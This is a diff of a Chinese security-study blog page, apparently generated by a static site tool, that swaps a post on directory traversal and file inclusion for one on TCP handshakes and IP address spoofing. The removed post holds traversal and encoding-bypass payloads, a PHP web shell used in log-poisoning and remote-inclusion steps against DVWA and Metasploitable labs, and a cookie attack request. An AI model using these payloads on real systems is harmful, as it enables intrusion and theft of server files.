@@ -79,16 +79,21 @@
 
 
 
-<meta name="description" content="1. 手动漏洞挖掘–目录遍历&#x2F;文件包含 Directory traversal&#x2F;File include（有区别&#x2F;没区别） 目录权限限制不严&#x2F;文件包含     ⭐区别: 目录遍历：操作系统内部文件 文件包含：1.LFI包含本地文件include           2.RFI远程文件包含include（php的include函数） ▲ Directory Browser和Directory tr">
+<meta name="description" content="1. TCP连接  TCP三次握手 ▲ TCP三次握手其实不是可靠的，存在悖论，最后一次握手的ACK无法确定服务器已收到      TCP四次挥手   2. IP地址欺骗 经常用于DoS攻击 根据IP头地址寻址 伪造IP源地址   边界路由过滤器 入站、出站   受害者可能是源、目的地址 绕过基于地址的验证 压力测试模拟多用户 上层协议（TCP序列号）▲ TCP链路劫持 ▲ ISP设置出站流量的">
 <meta name="keywords" content="安全">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Kali Linux笔记(四十六)：手动漏洞挖掘--目录遍历、文件包含">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;01&#x2F;08&#x2F;Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E5%85%AD)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&#x2F;index.html">
+<meta property="og:title" content="Kali Linux笔记(七十八)：TCP连接、IP地址欺骗">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;09&#x2F;Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83%E5%8D%81%E5%85%AB)%EF%BC%9ATCP%E8%BF%9E%E6%8E%A5%E3%80%81IP%E5%9C%B0%E5%9D%80%E6%AC%BA%E9%AA%97&#x2F;index.html">
 <meta property="og:site_name" content="Tomas&#39;Blog">
-<meta property="og:description" content="1. 手动漏洞挖掘–目录遍历&#x2F;文件包含 Directory traversal&#x2F;File include（有区别&#x2F;没区别） 目录权限限制不严&#x2F;文件包含     ⭐区别: 目录遍历：操作系统内部文件 文件包含：1.LFI包含本地文件include           2.RFI远程文件包含include（php的include函数） ▲ Directory Browser和Directory tr">
+<meta property="og:description" content="1. TCP连接  TCP三次握手 ▲ TCP三次握手其实不是可靠的，存在悖论，最后一次握手的ACK无法确定服务器已收到      TCP四次挥手   2. IP地址欺骗 经常用于DoS攻击 根据IP头地址寻址 伪造IP源地址   边界路由过滤器 入站、出站   受害者可能是源、目的地址 绕过基于地址的验证 压力测试模拟多用户 上层协议（TCP序列号）▲ TCP链路劫持 ▲ ISP设置出站流量的">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2020-01-15T06:11:09.059Z">
+<meta property="og:image" content="http:&#x2F;&#x2F;aliyun.wuyidaxue.top:8088&#x2F;kodex&#x2F;index.php?user&#x2F;publicLink&amp;fid=36a3IXsvHw1ur12Gqkwi96Ep5G049HecZzLAgwh2ScFae21FaTDOa2chcs_dWLY9qD06vQl8upON9Df5HfqdlFn5fup0Vd-a0D3M8873nco8g8vUcPCUfg876qigANSB&amp;file_name=&#x2F;TCP%E5%8D%8F%E8%AE%AE%E8%BF%87%E7%A8%8B.PNG">
+<meta property="og:image" content="http:&#x2F;&#x2F;aliyun.wuyidaxue.top:8088&#x2F;kodex&#x2F;index.php?user&#x2F;publicLink&amp;fid=b351ZG8u9CsMMGf92Sp3n_hIBGC4pbd6Zzsk39mBjAG6qDwuWypf_q-jtvBe6CL9Jg0XXVX-ZFd6hSaHDLc0X9Xo_6BX12c-TNmdd-mmibk4HqVWmVoS7gl4C3Bg_X-o&amp;file_name=&#x2F;TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B.PNG">
+<meta property="og:image" content="http:&#x2F;&#x2F;aliyun.wuyidaxue.top:8088&#x2F;kodex&#x2F;index.php?user&#x2F;publicLink&amp;fid=d3089Fg1meXZhMPfx8zkd1UCJvoCtU1wF5WWumNUI8ETayLy6RWTFKZ1DLTeMFGNXFc-bBdE8v9nPyX7DT1IV0K7dXpz1BMJre2N67--r2j1rMsqmSwcF4LBrpq368ij&amp;file_name=&#x2F;TCP%E5%9B%9B%E6%AC%A1%E6%8C%A5%E6%89%8B.PNG">
+<meta property="og:image" content="http:&#x2F;&#x2F;aliyun.wuyidaxue.top:8088&#x2F;kodex&#x2F;index.php?user&#x2F;publicLink&amp;fid=7345C9loEbVvgjmXUdP5_vFaroaNe4GADf_UsZFu0zXqawp0T5NMSe4aAEcQLfCWeBVU_rE9JSYQp-I5Bp67n6o6aiRZJkRD2rkNMt14udEXhNZAlbzD47JdJ0XzleU&amp;file_name=&#x2F;IP%E5%9C%B0%E5%9D%80%E6%AC%BA%E9%AA%97.PNG">
+<meta property="og:updated_time" content="2020-02-09T13:07:13.756Z">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;aliyun.wuyidaxue.top:8088&#x2F;kodex&#x2F;index.php?user&#x2F;publicLink&amp;fid=36a3IXsvHw1ur12Gqkwi96Ep5G049HecZzLAgwh2ScFae21FaTDOa2chcs_dWLY9qD06vQl8upON9Df5HfqdlFn5fup0Vd-a0D3M8873nco8g8vUcPCUfg876qigANSB&amp;file_name=&#x2F;TCP%E5%8D%8F%E8%AE%AE%E8%BF%87%E7%A8%8B.PNG">
 
 
 
@@ -118,13 +123,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2020/01/08/Kali Linux笔记(四十六)：手动漏洞挖掘--目录遍历、文件包含/"/>
+  <link rel="canonical" href="http://yoursite.com/2020/02/09/Kali Linux笔记(七十八)：TCP连接、IP地址欺骗/"/>
 
 
 
 
 
-  <title>Kali Linux笔记(四十六)：手动漏洞挖掘--目录遍历、文件包含 | Tomas'Blog</title>
+  <title>Kali Linux笔记(七十八)：TCP连接、IP地址欺骗 | Tomas'Blog</title>
   
 
 
@@ -243,7 +248,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/08/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E5%85%AD)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83%E5%8D%81%E5%85%AB)%EF%BC%9ATCP%E8%BF%9E%E6%8E%A5%E3%80%81IP%E5%9C%B0%E5%9D%80%E6%AC%BA%E9%AA%97/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Tomas">
@@ -260,7 +265,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Kali Linux笔记(四十六)：手动漏洞挖掘--目录遍历、文件包含</h1>
+          <h1 class="post-title" itemprop="name headline">Kali Linux笔记(七十八)：TCP连接、IP地址欺骗</h1>
         
 
         <div class="post-meta">
@@ -272,8 +277,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-08T16:06:25+08:00">
-                2020-01-08
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-09T21:09:14+08:00">
+                2020-02-09
               </time>
             
 
@@ -326,7 +331,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  874 字
+                  185 字
                 </span>
               
 
@@ -342,7 +347,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  3 分钟
+                  1 分钟
                 </span>
               
             </div>
@@ -364,147 +369,36 @@
 
       
         <hr>
-<h4 id="1-手动漏洞挖掘–目录遍历-文件包含"><a href="#1-手动漏洞挖掘–目录遍历-文件包含" class="headerlink" title="1. 手动漏洞挖掘–目录遍历/文件包含"></a>1. 手动漏洞挖掘–目录遍历/文件包含</h4><ul>
-<li>Directory traversal/File include（有区别/没区别）<ul>
-<li>目录权限限制不严/文件包含</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>⭐区别:
-目录遍历：操作系统内部文件
-文件包含：1.LFI包含本地文件include 
-         2.RFI远程文件包含include（php的include函数）
-▲ Directory Browser和Directory traversal/pass不同</code></pre></blockquote>
+<h4 id="1-TCP连接"><a href="#1-TCP连接" class="headerlink" title="1. TCP连接"></a>1. TCP连接</h4><p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=36a3IXsvHw1ur12Gqkwi96Ep5G049HecZzLAgwh2ScFae21FaTDOa2chcs_dWLY9qD06vQl8upON9Df5HfqdlFn5fup0Vd-a0D3M8873nco8g8vUcPCUfg876qigANSB&file_name=/TCP%E5%8D%8F%E8%AE%AE%E8%BF%87%E7%A8%8B.PNG" alt="TCP协议过程"></p>
 <ul>
-<li>修改Metasploitable的配置文件，使Metasploitable出现远程文件包含漏洞<ul>
-<li><strong><code>🔺命令：sudo vi /etc/php5/cgi/php.ini</code></strong></li>
-<li>allow_url_include=On</li>
-<li><strong><code>🔺命令：sudo /etc/init.d/apache2 restart</code></strong></li>
-</ul>
-</li>
-<li>应用程序功能操作文件，限制不严时导致访问WEB目录以外的文件<ul>
-<li>读、写文件、远程执行代码</li>
-</ul>
-</li>
-<li>特征但不绝对<ul>
-<li>?page=a.php</li>
-<li>?home=b.html</li>
-<li>?file=content</li>
-</ul>
-</li>
-<li>经典测试方法<ul>
-<li>?file=../../../../../../../../etc/passwd</li>
-<li>?page=file:///etc/passwd（文件包含的话，可以直接填写绝对路径）</li>
-<li>?home=main.cgi</li>
-<li>?page=<a href="http://www.a.com/1.php（远程文件包含）" target="_blank" rel="noopener">http://www.a.com/1.php（远程文件包含）</a></li>
-<li><a href="http://1.1.1.1/../../../../../dir/file.txt" target="_blank" rel="noopener">http://1.1.1.1/../../../../../dir/file.txt</a></li>
-</ul>
-</li>
-<li>编码绕过字符过滤<ul>
-<li>“.” “%00”–空字符（绕过文件扩展名过滤）</li>
-<li>?file=a.doc%00.php</li>
-<li>使用多种编码尝试</li>
-</ul>
-</li>
-<li>不同操作系统的路径特征字符<ul>
-<li>类Unix系统（根目录:/  目录层级分隔符:/）</li>
-<li>Windows系统（C:/  \或/）</li>
-</ul>
-</li>
-<li>URL编码、双层URL编码<ul>
-<li>%2e%2e%2f        解码：../</li>
-<li>%2e%2e%5c        解码：..\</li>
-<li>%252e%252e%255c  解码：..\（双层编码，%25解码后为%）</li>
-</ul>
-</li>
-<li>Unicode/UTF-8编码<ul>
-<li>..%c0%af         解码：../</li>
-<li>..%u2216</li>
-<li>..%c1%9c         解码：..\</li>
-</ul>
-</li>
-<li>其他系统路径可能使用到的字符<ul>
-<li>file.txt…</li>
-<li>file.txt<spaces></li>
-<li>file.txt````````</li>
-<li>file.txt&lt;&lt;&lt;&gt;&gt;&gt;</li>
-<li>./././file.txt</li>
-<li>nonexistant/../file.txt（不存在的目录）</li>
-</ul>
-</li>
-<li>UNC路径（文件共享路径）<ul>
-<li>\1.1.1.1\path\to\file.txt</li>
-</ul>
-</li>
-<li>本地文件抱哈LFI（一般很难代码执行）<ul>
-<li>查看文件</li>
-<li>代码执行</li>
+<li>TCP三次握手<ul>
+<li>▲ TCP三次握手其实不是可靠的，存在悖论，最后一次握手的ACK无法确定服务器已收到</li>
 </ul>
 </li>
 </ul>
-<blockquote>
-<pre><code>⭐LFI的代码执行
-1.Kali开启nc侦听80端口（目标主机），发送&lt;?php echo shell_exec($_GET[&apos;cmd&apos;]);?&gt;
-2.可查看/var/log/apache2/access.log中有记录（服务器apache2日志文件）
-3.查看access.log文件www-data用户是否可以进行执行修改
-4.chmod a+rx access.log（若www-data无权限，假设可修改文件属性）
-5.chmod a+xr apache2（若www-data无权限，假设可修改文件属性）
-6.ls -ld查看权限，保证上级上上级可被www-data执行
-7.?page=/var/log/apache2/access.log（LFI本地文件包含）</code></pre></blockquote>
+<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=b351ZG8u9CsMMGf92Sp3n_hIBGC4pbd6Zzsk39mBjAG6qDwuWypf_q-jtvBe6CL9Jg0XXVX-ZFd6hSaHDLc0X9Xo_6BX12c-TNmdd-mmibk4HqVWmVoS7gl4C3Bg_X-o&file_name=/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B.PNG" alt="TCP三次握手过程"></p>
 <ul>
-<li>远程文件执行RFI<ul>
-<li>出现概率少于LFI，但更容易被利用</li>
-<li>测试 </li>
+<li>TCP四次挥手</li>
+</ul>
+<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=d3089Fg1meXZhMPfx8zkd1UCJvoCtU1wF5WWumNUI8ETayLy6RWTFKZ1DLTeMFGNXFc-bBdE8v9nPyX7DT1IV0K7dXpz1BMJre2N67--r2j1rMsqmSwcF4LBrpq368ij&file_name=/TCP%E5%9B%9B%E6%AC%A1%E6%8C%A5%E6%89%8B.PNG" alt="TCP四次挥手过程"></p>
+<h4 id="2-IP地址欺骗"><a href="#2-IP地址欺骗" class="headerlink" title="2. IP地址欺骗"></a>2. IP地址欺骗</h4><ul>
+<li>经常用于DoS攻击</li>
+<li>根据IP头地址寻址<ul>
+<li>伪造IP源地址</li>
 </ul>
 </li>
+<li>边界路由过滤器<ul>
+<li>入站、出站</li>
 </ul>
-<blockquote>
-<pre><code>⭐测试远程文件包含
-1.kali本地侦听80端口（本机端口）
-2.Web page页?page=http://Kali 地址/a.php（不存在的php页面）
-3.若kali收到请求，则表示测试成功
-⭐远程文件包含
-1.Kali机子上vi 1.txt
-2.&lt;?php echo shell_exec($_GET[&apos;cmd&apos;]);?&gt;
-3.Kali机子上service apache2 start（存放在/var/www/html/）
-4.DVWA访问?page=http://kali ip地址/1.txt&amp;cmd=pwd</code></pre></blockquote>
-<ul>
-<li>DVWA的File Inclusion（low）</li>
-<li>多种绕过方法</li>
+</li>
+<li>受害者可能是源、目的地址</li>
+<li>绕过基于地址的验证</li>
+<li>压力测试模拟多用户</li>
+<li>上层协议（TCP序列号）▲ TCP链路劫持</li>
+<li>▲ ISP设置出站流量的策略，对伪造源地址出站流量的过滤（边界防火墙）</li>
+<li>▲ ISP设置入站流量的策略，对伪造内网地址入站流量的过滤（边界防火墙） </li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $file = $_GET[&apos;page&apos;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>DVWA的File Inclusion（mediaum）</li>
-<li>绕过方法:ht<a href="http://tp://dvwa/" target="_blank" rel="noopener">http://tp://dvwa/</a>….</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $file = $_GET[&apos;page&apos;];</span><br><span class="line"></span><br><span class="line">    $file = str_replace(&quot;http://&quot;,&quot;&quot;,$file);</span><br><span class="line">    $file = str_replace(&quot;https://&quot;,&quot;&quot;,$file);</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>DVWA的File Inclusion（high）</li>
-<li>暂无绕过方法</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $file = $_GET[&apos;page&apos;];</span><br><span class="line"></span><br><span class="line">    if($file!=&quot;include.php&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;ERROR:File not found!&quot;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>/usr/share/wfuzz/wordlist/vulns/（Kali集成攻击向量字典）</li>
-</ul>
-<h4 id="2-手动漏洞挖掘–Cookie存在漏洞"><a href="#2-手动漏洞挖掘–Cookie存在漏洞" class="headerlink" title="2. 手动漏洞挖掘–Cookie存在漏洞"></a>2. 手动漏洞挖掘–Cookie存在漏洞</h4><ul>
-<li>代码</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$template = &apos;blue.php&apos;</span><br><span class="line">if( is_set($_COOKIE[&apos;TEMPLATE&apos;]))</span><br><span class="line">    $template = $_COOKIE[&apos;TEMPLATE&apos;]</span><br><span class="line">include (&quot;/home/users/phpguru/template/&quot;.$template)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>攻击</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /vulnerable.php HTTP/1.0</span><br><span class="line">Cookie:TEMPLATE=../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>结果</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Content=Type:text/html</span><br><span class="line">Server:Apache</span><br><span class="line"></span><br><span class="line">root:fi3sED95ibqR6:0:1:System Operator:/:/bin/ksh</span><br><span class="line">daemon:*:1:1::/tmp:</span><br><span class="line">phpguru:f8fk3j1oIf31.:182:100:Developer:/home/users/phpguru/:bin/csh</span><br></pre></td></tr></table></figure>
-
+<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=7345C9loEbVvgjmXUdP5_vFaroaNe4GADf_UsZFu0zXqawp0T5NMSe4aAEcQLfCWeBVU_rE9JSYQp-I5Bp67n6o6aiRZJkRD2rkNMt14udEXhNZAlbzD47JdJ0XzleU&file_name=/IP%E5%9C%B0%E5%9D%80%E6%AC%BA%E9%AA%97.PNG" alt="IP地址欺骗"></p>
 
       
     </div>
@@ -535,8 +429,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2020/01/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E4%B8%89)%EF%BC%9ABurpsuite/" rel="next" title="Kali Linux笔记(四十三)：Burpsuite">
-                <i class="fa fa-chevron-left"></i> Kali Linux笔记(四十三)：Burpsuite
+              <a href="/2020/02/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83%E5%8D%81%E4%B8%83)%EF%BC%9ADoS%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%88%86%E7%B1%BB/" rel="next" title="Kali Linux笔记(七十七)：DoS介绍及分类">
+                <i class="fa fa-chevron-left"></i> Kali Linux笔记(七十七)：DoS介绍及分类
               </a>
             
           </div>
@@ -544,10 +438,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2020/01/08/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E4%B8%83)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="prev" title="Kali Linux笔记(四十七)：手动漏洞挖掘--文件上传">
-                Kali Linux笔记(四十七)：手动漏洞挖掘--文件上传 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -717,7 +607,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-手动漏洞挖掘–目录遍历-文件包含"><span class="nav-number">1.</span> <span class="nav-text">1. 手动漏洞挖掘–目录遍历/文件包含</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-手动漏洞挖掘–Cookie存在漏洞"><span class="nav-number">2.</span> <span class="nav-text">2. 手动漏洞挖掘–Cookie存在漏洞</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-TCP连接"><span class="nav-number">1.</span> <span class="nav-text">1. TCP连接</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-IP地址欺骗"><span class="nav-number">2.</span> <span class="nav-text">2. IP地址欺骗</span></a></li></ol></div>
             
 
           </div>
